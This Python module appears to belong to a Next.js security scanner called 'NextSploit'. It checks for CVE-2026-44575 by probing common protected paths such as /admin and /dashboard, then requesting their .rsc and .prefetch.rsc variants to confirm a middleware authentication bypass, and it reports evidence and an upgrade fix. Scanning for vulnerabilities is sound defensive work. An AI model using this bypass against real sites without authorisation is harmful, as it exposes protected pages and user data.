#!/usr/bin/env python3
"""
NextSploit — CVE-2026-44575: Middleware Bypass via Segment-Prefetch Routes

Root Cause:
  Next.js App Router generates route variants for segment prefetching
  (.rsc, .prefetch.rsc) whose middleware path-matchers differ from the
  canonical route. As a result, middleware is NOT triggered for those
  variants — granting unauthenticated access to protected pages.

Affected Versions : Next.js 15.2.0 – 15.5.15
Fixed In          : 15.5.16 / 16.2.5
CVSS              : High
"""

import requests
from core.config import ScanConfig, CVE_DATABASE, check_vuln_status
from core.reporter import ModuleResult, Finding
from core.output import log_info, log_success, log_warning, log_debug, print_finding

CVE_ID   = "CVE-2026-44575"
CVE_INFO = CVE_DATABASE[CVE_ID]

# Common paths that are often protected by middleware
_PROTECTED_CANDIDATES = [
    "/admin",
    "/dashboard",
    "/profile",
    "/settings",
    "/account",
    "/api/protected",
    "/api/admin",
    "/api/user",
    "/members",
    "/secure",
]

# Codes that indicate middleware is actively blocking the canonical path
_BLOCKED_CODES = {301, 302, 307, 308, 401, 403}

# Minimum RSC body size to rule out redirect-to-empty-page false positives
_MIN_RSC_BODY_BYTES = 200


def _is_rsc_payload(response: requests.Response) -> bool:
    """Return True if response looks like a real RSC / Next.js component payload."""
    ct = response.headers.get("content-type", "").lower()
    return (
        "text/x-component" in ct
        or "application/octet-stream" in ct
        or len(response.content) >= _MIN_RSC_BODY_BYTES
    )


def _probe(session: requests.Session, url: str, timeout: int):
    """Send a GET request; return (status_code, response) or (None, None) on error."""
    try:
        r = session.get(url, timeout=timeout, allow_redirects=False)
        return r.status_code, r
    except requests.RequestException:
        return None, None


def scan(config: ScanConfig) -> ModuleResult:
    result = ModuleResult(
        cve=CVE_ID,
        title=CVE_INFO["title"],
        severity=CVE_INFO["severity"],
        status="NOT VULNERABLE",
    )

    # Precondition Checks
    if not config.has_app_router():
        result.status = "NOT_APPLICABLE"
        log_info(f"[{CVE_ID}] App router not detected. Skipping.")
        return result

    session = config.create_session()
    target  = config.target.rstrip("/")

    log_info(f"Starting {CVE_ID} scan — Middleware Segment-Prefetch Bypass...")

    # ── Phase 1: Version-based pre-check ─────────────────────────────────────
    best_ver = config.version_state.best()
    version_detected = best_ver.value if best_ver else None

    if version_detected:
        log_debug(f"Detected Next.js version: {version_detected}")
        vuln_status = check_vuln_status(version_detected, CVE_ID)
        if vuln_status == "PATCHED":
            log_success(f"Version {version_detected} is patched for {CVE_ID}.")
            return result
        if vuln_status == "VULNERABLE":
            log_warning(f"Version {version_detected} is in the vulnerable range for {CVE_ID}.")

    # ── Phase 2: Active path probing ─────────────────────────────────────────
    log_debug(f"Probing {len(_PROTECTED_CANDIDATES)} candidate protected paths...")

    for path in _PROTECTED_CANDIDATES:
        normal_code, normal_resp = _probe(session, f"{target}{path}", config.timeout)

        if normal_code is None:
            continue  # Network error — skip this path

        # Only proceed if middleware actively blocks the canonical request
        if normal_code not in _BLOCKED_CODES:
            log_debug(f"  {path} → HTTP {normal_code} (not blocked, skip)")
            continue

        log_debug(f"  {path} → HTTP {normal_code} (blocked by middleware)")

        # Test the two bypass variants
        bypass_found  = False
        bypass_url    = ""
        bypass_code   = 0
        bypass_resp   = None

        for variant in (f"{path}.rsc", f"{path}.prefetch.rsc"):
            code, resp = _probe(session, f"{target}{variant}", config.timeout)
            if code == 200 and resp is not None and _is_rsc_payload(resp):
                bypass_found  = True
                bypass_url    = f"{target}{variant}"
                bypass_code   = code
                bypass_resp   = resp
                break

        if not bypass_found:
            log_debug(f"  No bypass confirmed for {path}")
            continue

        # ── Confirmed vulnerability ───────────────────────────────────────
        ct = bypass_resp.headers.get("content-type", "N/A")
        body_size = len(bypass_resp.content)
        detail = (
            f"Middleware bypass confirmed: {path} is protected (HTTP {normal_code}) "
            f"but {bypass_url} returns HTTP {bypass_code} "
            f"({body_size} bytes, Content-Type: {ct})"
        )
        log_warning(detail)

        evidence = {
            "canonical_url"        : f"{target}{path}",
            "canonical_status"     : normal_code,
            "bypass_url"           : bypass_url,
            "bypass_status"        : bypass_code,
            "bypass_content_type"  : ct,
            "bypass_body_bytes"    : body_size,
            "detected_version"     : version_detected or "unknown",
            "remediation"          : "Upgrade Next.js to 15.5.16 / 16.2.5 or newer.",
        }

        print_finding(CVE_ID, detail, evidence)

        result.add_finding(Finding(
            cve=CVE_ID,
            severity=CVE_INFO["severity"],
            title="Middleware Bypass via Segment-Prefetch Route Confirmed",
            status="VULNERABLE",
            detail=detail,
            evidence=evidence,
            confidence=0.95,
        ))

        # One confirmed bypass is sufficient — stop probing
        break

    # ── Phase 3: Version-only fallback (if no active bypass found) ───────────
    if result.finding_count == 0 and version_detected:
        vuln_status = check_vuln_status(version_detected, CVE_ID)
        if vuln_status == "VULNERABLE":
            detail = (
                f"Version-based detection: Next.js {version_detected} is in the "
                f"vulnerable range for {CVE_ID} (fix: 15.5.16). "
                "No protected path found for active confirmation."
            )
            log_warning(detail)
            evidence = {
                "detected_version"    : version_detected,
                "vulnerability_status": "VULNERABLE (version-based)",
                "note"                : "Active bypass requires a middleware-protected route.",
                "remediation"         : "Upgrade Next.js to 15.5.16 / 16.2.5 or newer.",
            }
            print_finding(CVE_ID, detail, evidence)
            result.add_finding(Finding(
                cve=CVE_ID,
                severity=CVE_INFO["severity"],
                title="Vulnerable Version Detected (Version-Based)",
                status="VULNERABLE",
                detail=detail,
                evidence=evidence,
                confidence=0.75,
            ))

    if result.finding_count == 0:
        log_success(f"No {CVE_ID} middleware bypass confirmed on target.")

    return result

